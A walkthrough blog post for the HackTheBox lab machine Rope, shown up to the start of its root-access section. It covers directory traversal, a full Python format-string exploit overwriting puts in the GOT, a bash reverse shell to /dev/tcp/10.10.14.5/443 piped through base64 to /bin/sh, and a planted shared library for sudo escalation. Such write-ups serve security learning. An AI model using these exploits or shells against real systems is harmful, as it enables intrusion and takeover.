---
title: HTB: Rope
url: https://0xdf.gitlab.io/2020/05/23/htb-rope.html
date: 2020-05-23T14:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: hackthebox, ctf, htb-rope, directory-traversal, format-string, pwntools, bruteforce, pwn, python, ida, aslr, pie, sudo, library, tunnel, canary, rop
---

![Rope](https://0xdfimages.gitlab.io/img/rope-cover.png)

Rope was all about binary exploitation. For initial access, I’ll use a directory traversal bug in the custom webserver to get a copy of that webserver as well as it’s memory space. From there, I can use a format string vulnerability to get a shell. To get to the next user, I’ll take advantage of an unsafe library load in a program that the current user can run with sudo. Finally, for root, I’ll exploit a locally running piece of software that requires brute forcing the canary, RBP, and return addresses to allows for an overflow and defeat PIE, and then doing a ROP libc leak to get past ASLR, all to send another ROP which provides a shell.

## Box Info

| Name | [Rope](https://hackthebox.com/machines/rope)  [Rope](https://hackthebox.com/machines/rope) [Play on HackTheBox](https://hackthebox.com/machines/rope) |
| --- | --- |
| Release Date | [03 Aug 2019](https://twitter.com/hackthebox_eu/status/1156481585841156097) |
| Retire Date | 23 May 2020 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Rope |
| Radar Graph | Radar chart for Rope |
| First Blood User | 01:31:27[sampriti sampriti](https://app.hackthebox.com/users/836) |
| First Blood Root | 03:11:17[sampriti sampriti](https://app.hackthebox.com/users/836) |
| Creator | [R4J R4J](https://app.hackthebox.com/users/13243) |

## Recon

### nmap

`nmap` shows only two ports open, SSH (TCP 22), and what looks like a web server on TCP 9999:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.148
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 10:19 EDT
Warning: 10.10.10.148 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.148                                         
Host is up (0.14s latency).                                               
Not shown: 52605 closed ports, 12928 filtered ports                       
PORT     STATE SERVICE                                                    
22/tcp   open  ssh                                                        
9999/tcp open  abyss                                                      

Nmap done: 1 IP address (1 host up) scanned in 50.03 seconds  

root@kali# nmap -p 22,9999 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.148
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 10:34 EDT           
Nmap scan report for 10.10.10.148                                         
Host is up (0.14s latency).                                               
                                                                          
PORT     STATE SERVICE VERSION                                            
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                            
|   2048 56:84:89:b6:8f:0a:73:71:7f:b3:dc:31:45:59:0e:2e (RSA)            
|   256 76:43:79:bc:d7:cd:c7:c7:03:94:09:ab:1f:b7:b8:2e (ECDSA)           
|_  256 b3:7d:1c:27:3a:c1:78:9d:aa:11:f7:c6:50:57:25:5e (ED25519)         
9999/tcp open  abyss?                                                     
| fingerprint-strings:                                                    
|   GetRequest, HTTPOptions:                                              
|     HTTP/1.1 200 OK                                                     
|     Accept-Ranges: bytes                                                
|     Cache-Control: no-cache                                             
|     Content-length: 4871                                                
|     Content-type: text/html                                             
|     <!DOCTYPE html>                                                     
|     <html lang="en">                                                    
|     <head>                                                              
|     <title>Login V10</title>                                            
|     <meta charset="UTF-8">                                          
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <!--===============================================================================================-->
|     <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>                     
|     <!--===============================================================================================-->
|     <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">             
|     <!--===============================================================================================-->
|     <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
|_    <!--===============================================
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.70%I=7%D=8/4%Time=5D46ED05%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1378,"HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCach         
SF:e-Control:\x20no-cache\r\nContent-length:\x204871\r\nContent-type:\x20t
SF:ext/html\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"en\">\r\n<head>\r
SF:\n\t<title>Login\x20V10</title>\r\n\t<meta\x20charset=\"UTF-8\">\r\n\t<
SF:meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-s
SF:cale=1\">\r\n<!--======================================================
SF:=========================================-->\t\r\n\t<link\x20rel=\"icon
SF:\"\x20type=\"image/png\"\x20href=\"images/icons/favicon\.ico\"/>\r\n<!-
SF:-======================================================================
SF:=========================-->\r\n\t<link\x20rel=\"stylesheet\"\x20type=\
SF:"text/css\"\x20href=\"vendor/bootstrap/css/bootstrap\.min\.css\">\r\n<!
SF:--=====================================================================
SF:==========================-->\r\n\t<link\x20rel=\"stylesheet\"\x20type=
SF:\"text/css\"\x20href=\"fonts/font-awesome-4\.7\.0/css/font-awesome\.min
SF:\.css\">\r\n<!--===============================================")%r(HTT
SF:POptions,1378,"HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCac
SF:he-Control:\x20no-cache\r\nContent-length:\x204871\r\nContent-type:\x20
SF:text/html\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"en\">\r\n<head>\
SF:r\n\t<title>Login\x20V10</title>\r\n\t<meta\x20charset=\"UTF-8\">\r\n\t
SF:<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-                                  
SF:scale=1\">\r\n<!--=====================================================
SF:==========================================-->\t\r\n\t<link\x20rel=\"ico                                  
SF:n\"\x20type=\"image/png\"\x20href=\"images/icons/favicon\.ico\"/>\r\n<!                 
SF:--=====================================================================                                  
SF:==========================-->\r\n\t<link\x20rel=\"stylesheet\"\x20type=                            
SF:\"text/css\"\x20href=\"vendor/bootstrap/css/bootstrap\.min\.css\">\r\n<
SF:!--====================================================================                                                                                                  
SF:===========================-->\r\n\t<link\x20rel=\"stylesheet\"\x20type
SF:=\"text/css\"\x20href=\"fonts/font-awesome-4\.7\.0/css/font-awesome\.mi
SF:n\.css\">\r\n<!--===============================================");    
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                   
                                                                          
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.72 seconds       

```

Based on the [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server), this is likely Ubuntu Bionic (18.04). I don’t recognize the web server.

### Website - TCP 9999

#### Site

The site presents a login page:

![1566832914780](https://0xdfimages.gitlab.io/img/1566832914780.png)

This is a really weird webserver. If I put in some credentials, and hit login, it just re-requests the root page. There’s no POST request or GET request with the creds I entered.

If I check “Remember me”, it submits a GET to `http://10.10.10.148:9999/?remember-me=on`, with no further parameters, which returns a 404.

#### Directory Brute Force

I ran `gobuster` on this server, and it turned up some typical paths:

```

root@kali# gobuster dir -u http://10.10.10.148:9999 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50                                                                    
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.148:9999
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/08/26 11:26:36 Starting gobuster
===============================================================
/images (Status: 200)
/css (Status: 200)
/js (Status: 200)
/vendor (Status: 200)
/fonts (Status: 200)
===============================================================
2019/08/26 11:31:33 Finished
===============================================================

```

Nothing interesting there. I’ll move on.

#### Weird Webserver Behavior

I started to browse around some of the paths I found with `gobuster`, and I noticed something weird.

When I visit `http://10.10.10.148:9999/js`, it doesn’t redirect me to `http://10.10.10.148:9999/js/`, but just loads a dir walk from there:

![1566833598800](https://0xdfimages.gitlab.io/img/1566833598800.png)

However, the link to `main.js` is dead. It points to `http://10.10.10.148:9999/main.js`. It’s missing the folder. When I visit `http://10.10.10.148:9999/js/`, this is no longer an issue. This is clearly a custom and buggy webserver.

## Shell as john

### Directory Traversal

The first vulnerability I found in the webserver was a directory traversal bug. It was as simple as visiting `http://10.10.10.148:9999//`, which clearly shows the system root:

![1567197471998](https://0xdfimages.gitlab.io/img/1567197471998.png)

I could exploit this traversal with `curl` as well, using `--path-as-is` (and also confirm the OS version):

```

root@kali# curl http://10.10.10.148:9999//etc/lsb-release --path-as-is
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.2 LTS"

```

### httpserver

Now with more file system access, I looked around, but didn’t find too much of interest. The webserver is running out of `/opt/www/`:

![1567197742441](https://0xdfimages.gitlab.io/img/1567197742441.png)

I grabbed a copy of it to look at. First, it’s worth noting that this is a 32-bit elf, and it isn’t stripped:

```

root@kali# file httpserver
httpserver: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e4e105bd11d096b41b365fa5c0429788f2dd73c3, not stripped

```

I opened it in Ida Pro Free, and took a look. Starting at `main`, I see at the bottom a call to `accept`:

![1567198326372](https://0xdfimages.gitlab.io/img/1567198326372.png)

I’d expect to see a `fork` immediately following the `accept` call so that one process can handle the request and the other can continue listening. I’m going to guess that the `fork` is happening in `process`, and that likely the parent process is returning 0, thus taking that jump to close the file descriptor from `accept`, and loop back to `accept` again, and that the child is returning 1, and when that sub finishes, it exits.

At this point I’m really just scanning through the functions to look for where my input is handled. Inside `process`, there’s a call to `fork` (as expected), and the child process calls `parse_request`. I’ll dive in there.

This function has a fair number of branches, but it’s where I’ll see the program parse the request.

![1567198689527](https://0xdfimages.gitlab.io/img/1567198689527.png)

At the top, there’s a call to `sscanf`, which reads the request into two strings split on a space. In a debugger, it looks like this:

```

   0x565aeebb <parse_request+156>:      push   eax
   0x565aeebc <parse_request+157>:      lea    eax,[ebp-0xc0c]
   0x565aeec2 <parse_request+163>:      push   eax
=> 0x565aeec3 <parse_request+164>:      call   0x565ae1f0 <__isoc99_sscanf@plt>
   0x565aeec8 <parse_request+169>:      add    esp,0x10
   0x565aeecb <parse_request+172>:      jmp    0x565aef69 <parse_request+330>
   0x565aeed0 <parse_request+177>:      sub    esp,0x4
   0x565aeed3 <parse_request+180>:      push   0x400
Guessed arguments:
arg[0]: 0xffae95dc ("GET /robots.txt HTTP/1.1\r\n")
arg[1]: 0x565b027c ("%s %s")
arg[2]: 0xffae99dc --> 0x0 <-- gets http req type
arg[3]: 0xffae9ddc --> 0x0 <-- gets file path

```

So this will capture the request method and the file path. Then it goes into this loop, where it parses each line of the request. Without looking in too much detail, I see it handling converting `/` to `./index.html` and process a `Range: bytes=%lu-%lu` header.

I spent some time trying to get the program to crash here at this `strcpy`:

![1567199039550](https://0xdfimages.gitlab.io/img/1567199039550.png)

I couldn’t get it to crash.

Back up in `process`, there are branches to handle serving static files, directories, and errors:

![1567199123500](https://0xdfimages.gitlab.io/img/1567199123500.png)

Below that, I see `log_access`. Jumping in there I’ll notice a class of bug that isn’t too common anymore - a format string vulnerability:

![1567199501359](https://0xdfimages.gitlab.io/img/1567199501359.png)

The `req_struct` variable is a struct in memory that holds both the HTTP path and the method here. The path is located at offset 0, so that’s what it’s trying to print, and that’s where I can attack.

### Format String Vulnerabilities

A great reference for these vulnerabilities is the LiveOverflow series of YouTube videos, specially [0x11](https://www.youtube.com/watch?v=0WvrSfcdq1I), [0x12](https://www.youtube.com/watch?v=kUk5pw4w0h4&vl=en), and [0x13](https://www.youtube.com/watch?v=t1LH9D5cuK4). `printf` takes as an argument a format string, which includes space holders for variables that will be filled into it. So when this program called `printf("%s:%d %d - %s", ip, port, status_code, path)`, `printf` will take first string, see there are 4 place holders, and then get the next four items off the stack (where arguments are passed in x86), and use them to fill in the string. So in assembly pseudo-code, this looks like:

```

push [address of path string]
push [int value of status code]
push [int value of port]
push [address of ip string]
push [address of %s:%d %d - %s]
call printf

```

So what would happen if the string had more placeholders than things pushed to the stack? `printf` doesn’t know how many things you pushed or what the author expected to be there. It just keeps reading off items.

So in the second case, where there’s a call to `printf(filepath)`, if I put placeholders into the file path, I can start to read stack memory. If I visit: `http://localhost:9999/AAAABBBBCCCC.%08x.%08x.%08x.%08x` (you may need to url encode those `%`), I can see the logs print:

```

accept request, fd is 4, pid is 23471
127.0.0.1:35650 404 - AAAABBBBCCCC.f7fa019c.00008b42.00000194.ffca4da8
request method:
GET

```

That’s four words of stack memory dumped out. It’s also worth knowing that my input is also on the stack. So if I add enough, I can see the ABCs show up:

![1567201010564](https://0xdfimages.gitlab.io/img/1567201010564.png)

In fact, after the ABC, I see 38 (‘`8`), 30 (`0`), 25 (`%`), 2e (`.`), 7b (`x`). Ignore if that feels out of order… that’s just endianness. But I have found the format string in stack memory.

All of this output I’m seeing on my local copy of the webserver. On Rope, I can’t see the log output, so what good does dumping stack memory do me? Not much. I’m using `%x` above to show words as hex. There’s another format string, `%n`, which writes the number of bytes written in the string up to that point to the address. I can use this to get arbitrary write! The videos go into good detail and examples on how to do this. It involves replacing the As above with the address I want to write to, then using the notation `%4$x` notation (in that example it will print the 4th word) so I don’t have to have 60 words to get to where the address is. And since I’m using `%n`, it will write to that address, so I’ll have something like `%30x%4$n`, which would write one hex word padded to 30 bytes, and then write the length of string written thus far into the 4th address from the top of the stack.

### Format String Strategy

What can I do with arbitrary write? Well, shortly after the `printf` call there are two `puts` calls. The first prints a static string, but the second calls `puts(req_method)`, something I control. The Global Offset Table (GOT) is a table of addresses that the main program uses to jump to library addresses that are loaded at run time. If I can overwrite the address of puts in the (GOT) with the address of `system`, I can make my request method the command I want to run, and I’ll get execution.

### General Notes

It’s really hard to show all the trial and error and struggles that went into getting what will look like a hopefully beautiful and simple python script below. I spent hours in IDA and `gdb` testing and troubleshooting. That kind of thing is not easy to put into a blog post, through I try to call out areas that caused me issues. This is partly what makes [Ippsec’s videos](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) so brilliant, getting to see how he troubleshoots problems in real time.

To run `gdb` for something like this, I’ll want to have `follow-fork-mode child` as I already saw that the server will fork the processing into a new process. I’ll also want to set `detach-on-fork off` so that I don’t have to constantly restart `gdb`. I did this by dropping those two into my `~/.gdbinit` file, along with [peda](https://github.com/longld/peda):

```

root@kali# cat ~/.gdbinit 
source ~/peda/peda.py
set follow-fork-mode child
set detach-on-fork off

```

Next, start the webserver on it’s own, and then attach to it with `gdb` using the `-p [pid]` option. It will then run up to the `accept` call and break, since that’s where the program is waiting for input. Once a child thread completes, I’ll just run `inferiors 1` to go back to the main thread. Sometimes things get screwed up, and I’ll just restart `gdb`.

### Obsticle 1: Memory Leak

I can see this binary has protections in place like PIE, which means that important addresses are going to be moving around on each run:

```

gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial

```

I’ll need to find a way to leak the address space for both the main executable as well as the libc in order to carry out my overwrite.

I do have file system access already via the directory traversal bug in the webserver. And the memory maps for each process in Linux are accessible via a file. So I browse to `http://10.10.10.148:9999//proc/self/`, and the `maps` file is there:

![1567231687141](https://0xdfimages.gitlab.io/img/1567231687141.png)

But when I click on it, nothing comes back. I noticed that it’s size 0 in the directory listing. On my local machine, they show up as size 0 as well, but there’s also content:

```

root@kali# ls -l /proc/self/maps
-r--r--r-- 1 root root 0 Aug 31 02:04 /proc/self/maps
root@kali# cat /proc/self/maps
55aeae6fa000-55aeae6fc000 r--p 00000000 08:01 3949951                    /usr/bin/cat
55aeae6fc000-55aeae701000 r-xp 00002000 08:01 3949951                    /usr/bin/cat
55aeae701000-55aeae703000 r--p 00007000 08:01 3949951                    /usr/bin/cat
55aeae704000-55aeae705000 r--p 00009000 08:01 3949951                    /usr/bin/cat
55aeae705000-55aeae706000 rw-p 0000a000 08:01 3949951                    /usr/bin/cat
55aeafd2e000-55aeafd4f000 rw-p 00000000 00:00 0                          [heap]
7fe0662c3000-7fe066316000 r--p 00000000 08:01 4592543                    /usr/lib/locale/aa_DJ.utf8/LC_CTYPE
7fe066316000-7fe06658e000 r--p 00000000 08:01 4592541                    /usr/lib/locale/aa_DJ.utf8/LC_COLLATE
7fe06658e000-7fe0665b0000 r--p 00000000 08:01 4206914                    /usr/lib/x86_64-linux-gnu/libc-2.28.so
...[snip]...

```

This memory file should be readable by it’s own process. Back to the source. I mentioned earlier that the server looks for a range header. It uses `sscanf` to extract two values that are passed back as part of the information returned from `parse_request`. When the server serves a static file, if the range header was set, it uses those values for how much to read from the file. If it is not, it uses the output for a `stat` call on the file to get the size and send that much. Locally, I can see that `stat` shows a size of 0 on `/proc/self/maps`(despite the fact that there is content):

```

root@kali# stat /proc/self/maps 
  File: /proc/self/maps
  Size: 0               Blocks: 0          IO Block: 1024   regular empty file
Device: 5h/5d   Inode: 742335      Links: 1
Access: (0444/-r--r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2020-05-17 14:32:23.803725346 -0400
Modify: 2020-05-17 14:32:23.803725346 -0400
Change: 2020-05-17 14:32:23.803725346 -0400
 Birth: -

```

So with no range header, it sends 0 bytes from this file.

I can test this by jumping over to repeater and adding the header in. It works!

[![burp to read /proc/self/maps](https://0xdfimages.gitlab.io/img/1567232400107.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1567232400107.png)

Now I can get the base address for both the program (first line) and libc, as well as the location of the libc its running, `/lib32/libc-2.27.so`.

I can confirm that these leaks will point to the right places by checking on my local system:

[![Memory example](https://0xdfimages.gitlab.io/img/rope-localhost_libc_calcs.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/rope-localhost_libc_calcs.png)

### Obsticle 2: Command

I can pass my command to `puts` (which is now `system`), but I have the constraint that that variable is only read up to the first space character. So my challenge is getting the execution I want without any spaces. I immediately thought of using tabs from a [similar challenge in Helpline](/2019/08/17/htb-helpline-win.html#shell-as-leo), but tabs didn’t seem to work. However, the `${IFS}` environment variable did! So a command like `echo${IFS}0xdf` would parse by the webserver as one word, but when passed to `system`, the shell would treat `${IFS}` as whitespace!

### Script It

Now I’ll build my script. It’s difficult to show this kind of thing step by step, but know that this was built up little bit by bit and eventually polished to this. I’ll walk through it after the code:

```

  1 #!/usr/bin/env python3
  2 import base64
  3 import fcntl
  4 import requests
  5 import socket
  6 import struct
  7 import sys
  8 import urllib.parse
  9 
 10 
 11 def pad(s):
 12     return s+b"."*(1024-len(s))
 13 
 14 
 15 def get_memory_base_addresses(ip, port=9999):
 16     r = requests.get(f'http://{ip}:{port}//proc/self/maps', headers={"Range": "bytes=0-1000000"})
 17     libc_base = int([x for x in r.text.split('\n') if 'libc-' in x][0].split('-')[0], 16)
 18     httpserver_base = int([x for x in r.text.split('\n') if 'httpserver' in x][0].split('-')[0], 16)
 19     return (httpserver_base, libc_base)
 20 
 21 
 22 if len(sys.argv) != 3:
 23     print(f'[-] Usage: {sys.argv[0]} [target ip] [command]')
 24     sys.exit()
 25 
 26 target_ip = sys.argv[1]
 27 cmd = sys.argv[2]
 28 
 29 # readelf -s libc-2.27.so_ | grep " system@@GLIBC"
 30 #  1510: 0003cd10    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
 31 # readelf -s /usr/lib/i386-linux-gnu/libc-2.28.so | grep " system@@GLIBC"                   
 32 #  1525: 0003ec00    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0  
 33 system_offsets = {'10.10.10.148': int('3cd10', 16),
 34                   '127.0.0.1':    int('3ec00', 16)}
 35 
 36 try:
 37     system_offset = system_offsets[target_ip]
 38 except KeyError:
 39     print(f"[-] Invalid target: {target_ip}")
 40     sys.exit(1)
 41 
 42 main_base, libc_base = get_memory_base_addresses(ip=target_ip)
 43 print(f"[+] Main base address:   0x{main_base:08x}")
 44 print(f"[+] libc base address:   0x{libc_base:08x}")
 45 
 46 puts_got = main_base + 0x5048
 47 print(f"[+] GOT table for puts:  0x{puts_got:08x}")
 48 
 49 system = libc_base + system_offset
 50 print(f"[+] system address:      0x{system:08x}")
 51 system_lower = system % pow(2,16)
 52 system_upper = system // pow(2,16)
 53 print(f'[+] system lower:            0x{system_lower:04x}')
 54 print(f'[+] system upper:        0x{system_upper:04x}')
 55 
 56 exploit = b""
 57 exploit += struct.pack("I", puts_got)
 58 exploit += struct.pack("I", puts_got+2)
 59 exploit += f'%53${system_lower - 8}x'.encode()
 60 exploit += b'%53$n'
 61 exploit += f'%54${system_upper - system_lower + pow(2,16)}x'.encode()
 62 exploit += b'%54$n'
 63 
 64 command = f'echo {base64.b64encode(cmd.encode()).decode()} | base64 -d | /bin/sh'.replace(' ', '${IFS}')
 65 
 66 print(f"[*] Command: {cmd}")
 67 print(f"[*] Encoded command: {command}")
 68 print("[*] Sending exploit")
 69 
 70 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 71 s.connect((target_ip, 9999))
 72 s.send(f'{command} /{urllib.parse.quote(pad(exploit))}\r\n\r\n'.encode())
 73 s.close()

```

Comments:
- I’ll use a `pad` function to make sure my input stays the same length each time. Not doing this can make the stack change as I try different payloads. [Lines 11-12]
- `get_memory_base_addresses` will use the webserver to leak the `maps` file to leak the addresses I need. [15-19]
- There’s a lot of code to just calculate different addresses and numbers I’ll need. [29-54]
- I send the overwrite in two parts. I could do this in one, but it would take a long time because I’d have to write a string that was in the billions of characters long. Instead, I’ll overwrite the first two bytes using a few thousand characters, and then the top two bytes. This will stomp on the low two bytes of the next word, but that’s ok. [56-62]
- One other note, the number I want to write the second time is `system_upper - system_lower`. But I want this to be a positive number always, so I’ll add 2^16 to it. If lower is bigger, this gets it back to positive. If upper is bigger, this adds an extra 1 into the two bytes I’m stomping from a different word, which is fine. [61]
- I’ll create a single command that echos some base64 into `base64 -d` and then into `sh`. Then my input can be the base64 data. [64]
- Connect to the server and send the request. [70-73]

### Shell

Now I can run my script to get a shell. In building this up, I tested with touching a file in `/tmp` and then checking via the webserver. But once it’s working, I can use a reverse shell:

```

root@kali# ./rope_shell.py 10.10.10.148 "bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'"                                                                                        
[+] Main base address:   0x565be000
[+] libc base address:   0xf7d0d000
[+] GOT table for puts:  0x565c3048
[+] system address:      0xf7d49d10
[+] system lower:            0x9d10
[+] system upper:        0xf7d4
[*] Command: bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
[*] Encoded command: echo${IFS}YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MyAwPiYxJw==${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}/bin/sh
[*] Sending exploit

```

And get a callback:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.148.
Ncat: Connection from 10.10.10.148:60820.
bash: cannot set terminal process group (1103): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
john@rope:/opt/www$ id
uid=1001(john) gid=1001(john) groups=1001(john)

```

## Shell as r4j

### Enumeration

Before uploading any recon scripts, in my basic checks I always check `sudo`, and here, there’s something interesting. I can run `/usr/bin/readlogs` as r4j without password:

```

john@rope:/$ sudo -l
Matching Defaults entries for john on rope:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on rope:
    (r4j) NOPASSWD: /usr/bin/readlogs

```

The file is a 64-bit executable:

```

john@rope:/$ file /usr/bin/readlogs 
/usr/bin/readlogs: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=67bdf14148530fcc5c26260c3450077442e89f66, not stripped

```

And when I run it, I get a dump of what looks like a tail on `auth.log`:

```

john@rope:/$ sudo -u r4j /usr/bin/readlogs
Aug 31 08:32:01 rope CRON[28278]: pam_unix(cron:session): session closed for user root
Aug 31 08:34:01 rope CRON[28284]: pam_unix(cron:session): session opened for user root by (uid=0)
Aug 31 08:34:01 rope CRON[28284]: pam_unix(cron:session): session closed for user root
Aug 31 08:36:01 rope CRON[28288]: pam_unix(cron:session): session opened for user root by (uid=0)
Aug 31 08:36:01 rope CRON[28288]: pam_unix(cron:session): session closed for user root
Aug 31 08:38:01 rope CRON[28314]: pam_unix(cron:session): session opened for user root by (uid=0)
Aug 31 08:38:01 rope CRON[28314]: pam_unix(cron:session): session closed for user root
Aug 31 08:38:22 rope sudo:     john : TTY=pts/2 ; PWD=/opt/www ; USER=root ; COMMAND=list
Aug 31 08:39:58 rope sudo:     john : TTY=pts/2 ; PWD=/ ; USER=r4j ; COMMAND=/usr/bin/readlogs
Aug 31 08:39:58 rope sudo: pam_unix(sudo:session): session opened for user r4j by (uid=0)

```

### Reversing

I send a copy of the file back to my machine using `nc`, and open it IDA. It’s a super simple program. `main` simply calls `_printlog`:

![1567244818386](https://0xdfimages.gitlab.io/img/1567244818386.png)

Double clicking on that takes me to an a `jmp` to an external reference:

![1567244849866](https://0xdfimages.gitlab.io/img/1567244849866.png)

### liblog.so

Back in my shell, I can run `ldd` to see what libraries are imported by `readlogs`. `liblog.so` jumps out as unusual:

```

john@rope:/$ ldd /usr/bin/readlogs
        linux-vdso.so.1 (0x00007ffced759000)
        liblog.so => /lib/x86_64-linux-gnu/liblog.so (0x00007f87ab648000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f87aae3e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f87ab431000)

```

Also, checking out all there, the standard `libc` and `ld` (linker) libraries are symbolic links to the actual binaries. But `liblog.so` is actually sitting at that path, and writable by anyone!

```

john@rope:/$ ls -l /lib/x86_64-linux-gnu/liblog.so /lib/x86_64-linux-gnu/libc.so.6 /lib64/ld-linux-x86-64.so.2
lrwxrwxrwx 1 root root    32 Apr 16  2018 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.27.so
lrwxrwxrwx 1 root root    12 Apr 16  2018 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.27.so
-rwxrwxrwx 1 root root 15984 Jun 19 19:06 /lib/x86_64-linux-gnu/liblog.so

```

### Path 1: Create an so

I’ll create a simple c program and upload it to Rope:

```

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void printlog() {
    execve("/bin/sh", NULL, NULL);
}

```

This code has the `printlog` function, and it just runs a shell. I’ll compile it into a shared library, and despite some warnings, it makes a shared object file:

```

john@rope:/dev/shm$ gcc -shared -o liblog-evil.so -fPIC liblog-evil.c
liblog-evil.c: In function ‘printlog’:
liblog-evil.c:6:5: warning: null argument where non-null required (argument 2) [-Wnonnull]
     execve("/bin/sh", NULL, NULL);
     ^~~~~~
john@rope:/dev/shm$ file liblog-evil.so             
liblog-evil.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=744ac31a55faeae58bd3661f32f48436fecbad2f, not stripped

```

Now I’ll copy it into place of the library, and run `readlogs`:

```

john@rope:/dev/shm$ cp liblog-evil.so /lib/x86_64-linux-gnu/liblog.so
john@rope:/dev/shm$ sudo -u r4j /usr/bin/readlogs
$ id
uid=1000(r4j) gid=1000(r4j) groups=1000(r4j),4(adm)

```

### Path 2: Edit liblog.so

Alternatively, I can pull back `liblog.so` and take a look at `printlog` in IDA:?

![1567246044909](https://0xdfimages.gitlab.io/img/1567246044909.png)

It is just calling `system` on a static string. I can open a copy of the library up in a hex editor (I’m using `bless`), scroll down until I see the string, and modify it to `/bin/sh\x00`:

[![hex editing](https://0xdfimages.gitlab.io/img/1567246167348.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1567246167348.png)

I can upload that to Rope, copy it into place, and run `sudo readlogs` to get a shell as r4j.

## Shell as root

### Enumeration

Running `netstat` to look for listening ports shows a new port, 1337, listening only on localhost:

```

r4j@rope:~$ netstat -plnt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

```

Additionally, looking at the process list, `contact` jumps out as likely the one listening:

```

r4j@rope:~$ ps auxww                                                          
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND     
...[snip]...
root      1102  0.0  0.0   4628   856 ?        Ss   Aug30   0:00 /bin/sh -c /opt/support/contact
root      1103  0.0  0.0   4628   876 ?        Ss   Aug30   0:00 /bin/sh -c sudo -u john /opt/www/run.sh
root      1104  0.0  0.0   4516  1688 ?        S    Aug30   0:00 /opt/support/contact
root      1106  0.0  0.2  66552  4440 ?        S    Aug30   0:00 sudo -u john /opt/www/run.sh
john      1112  0.0  0.1  11592  3176 ?        S    Aug30   0:00 /bin/bash /opt/www/run.sh
john      1116  0.0  0.0   2372  1192 ?        S    Aug30   0:24 ./httpserver
...[snip]...

```

It starts just before the webserver, and runs as root.

I couldn’t have entered the `/opt/support` folder before, but now as r4j, I’m a member of the `adm` group, so I can:

```

r4j@rope:/opt$ ls -l
total 12
